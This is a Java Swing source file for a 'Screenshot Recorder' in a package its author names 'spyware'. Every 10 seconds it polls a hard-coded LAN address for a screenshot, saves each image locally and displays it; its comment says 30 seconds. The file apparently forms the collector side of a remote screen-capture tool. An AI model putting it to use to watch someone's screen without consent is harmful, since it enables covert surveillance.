package com.github.moaxcp.spyware;

import javax.swing.*;
import java.awt.*;
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * Recorder class that navigates to /screenshot every 30 seconds, saves the file to a screenshot directory,
 * and displays it in a Swing window.
 */
public class Recorder extends JFrame {
    private static final String DEFAULT_URL = "http://192.168.7.236:8080/screenshot";
    private static final String SCREENSHOT_DIR = "screenshots";
    private static final DateTimeFormatter FORMATTER = DateTimeFormatter.ofPattern("yyyyMMdd-HHmmss");

    private final JLabel imageLabel;
    private final JTextField urlField;
    private final Path directory;
    private final HttpClient client;
    private final ScheduledExecutorService executor;
    private Image currentImage;

    public Recorder() {
        String initialUrl = System.getProperty("screenshot.url", DEFAULT_URL);
        this.directory = Paths.get(SCREENSHOT_DIR);
        this.client = HttpClient.newHttpClient();
        this.executor = Executors.newSingleThreadScheduledExecutor();

        setTitle("Screenshot Recorder");
        setSize(800, 600);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLayout(new BorderLayout());

        JPanel controlPanel = new JPanel(new BorderLayout());
        urlField = new JTextField(initialUrl);
        JButton screenshotButton = new JButton("Take Screenshot");
        screenshotButton.addActionListener(e -> {
            new Thread(() -> {
                try {
                    captureScreenshot();
                } catch (Exception ex) {
                    System.err.println("Error capturing screenshot: " + ex);
                }
            }).start();
        });

        JPanel urlPanel = new JPanel(new BorderLayout());
        urlPanel.add(new JLabel("URL: "), BorderLayout.WEST);
        urlPanel.add(urlField, BorderLayout.CENTER);

        controlPanel.add(urlPanel, BorderLayout.CENTER);
        controlPanel.add(screenshotButton, BorderLayout.EAST);

        imageLabel = new JLabel("Waiting for first screenshot...", SwingConstants.CENTER) {
            @Override
            protected void paintComponent(Graphics g) {
                if (currentImage != null) {
                    int width = getWidth();
                    int imgWidth = currentImage.getWidth(null);
                    int imgHeight = currentImage.getHeight(null);
                    if (imgWidth > 0 && imgHeight > 0) {
                        int scaledHeight = (int) ((double) imgHeight * width / imgWidth);
                        g.drawImage(currentImage, 0, 0, width, scaledHeight, null);
                    }
                } else {
                    super.paintComponent(g);
                }
            }
        };
        JScrollPane scrollPane = new JScrollPane(imageLabel);
        scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);

        JPanel screenshotTab = new JPanel(new BorderLayout());
        screenshotTab.add(controlPanel, BorderLayout.NORTH);
        screenshotTab.add(scrollPane, BorderLayout.CENTER);

        JTabbedPane tabbedPane = new JTabbedPane();
        tabbedPane.addTab("Screenshot", screenshotTab);
        add(tabbedPane, BorderLayout.CENTER);

        setupDirectory();
        startRecording();

        addWindowListener(new java.awt.event.WindowAdapter() {
            @Override
            public void windowClosing(java.awt.event.WindowEvent e) {
                stopRecording();
            }
        });

        addComponentListener(new java.awt.event.ComponentAdapter() {
            @Override
            public void componentResized(java.awt.event.ComponentEvent e) {
                if (currentImage != null) {
                    int width = imageLabel.getWidth();
                    int imgWidth = currentImage.getWidth(null);
                    int imgHeight = currentImage.getHeight(null);
                    if (width > 0 && imgWidth > 0 && imgHeight > 0) {
                        int scaledHeight = (int) ((double) imgHeight * width / imgWidth);
                        imageLabel.setPreferredSize(new Dimension(width, scaledHeight));
                        imageLabel.revalidate();
                    }
                }
            }
        });
    }

    private void setupDirectory() {
        try {
            Files.createDirectories(directory);
        } catch (IOException e) {
            System.err.println("Failed to create screenshot directory: " + e.getMessage());
        }
    }

    private void startRecording() {
        System.out.println("Starting recorder. Saving screenshots to " + directory.toAbsolutePath());
        executor.scheduleAtFixedRate(() -> {
            try {
                captureScreenshot();
            } catch (Exception e) {
                System.err.println("Error capturing screenshot: " + e);
            }
        }, 0, 10, TimeUnit.SECONDS);
    }

    private void stopRecording() {
        System.out.println("Stopping recorder...");
        executor.shutdown();
        try {
            if (!executor.awaitTermination(5, TimeUnit.SECONDS)) {
                executor.shutdownNow();
            }
        } catch (InterruptedException e) {
            executor.shutdownNow();
        }
    }

    private void captureScreenshot() throws IOException, InterruptedException {
        String url = urlField.getText();
        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(url))
                .GET()
                .build();

        HttpResponse<byte[]> response = client.send(request, HttpResponse.BodyHandlers.ofByteArray());

        if (response.statusCode() == 200) {
            byte[] imageBytes = response.body();
            String timestamp = LocalDateTime.now().format(FORMATTER);
            String filename = "screenshot-" + timestamp + ".png";
            Path filePath = directory.resolve(filename);
            Files.write(filePath, imageBytes);
            System.out.println("Saved screenshot to " + filePath);

            updateDisplay(imageBytes);
        } else {
            System.err.println("Failed to fetch screenshot. Status code: " + response.statusCode());
        }
    }

    private void updateDisplay(byte[] imageBytes) {
        SwingUtilities.invokeLater(() -> {
            ImageIcon icon = new ImageIcon(imageBytes);
            currentImage = icon.getImage();
            imageLabel.setIcon(null);
            imageLabel.setText("");
            
            // Set preferred size so JScrollPane knows how much to scroll
            int width = imageLabel.getWidth();
            int imgWidth = currentImage.getWidth(null);
            int imgHeight = currentImage.getHeight(null);
            if (width > 0 && imgWidth > 0 && imgHeight > 0) {
                int scaledHeight = (int) ((double) imgHeight * width / imgWidth);
                imageLabel.setPreferredSize(new Dimension(width, scaledHeight));
            }
            
            imageLabel.revalidate();
            imageLabel.repaint();
        });
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> {
            Recorder recorder = new Recorder();
            recorder.setVisible(true);
        });
    }
}
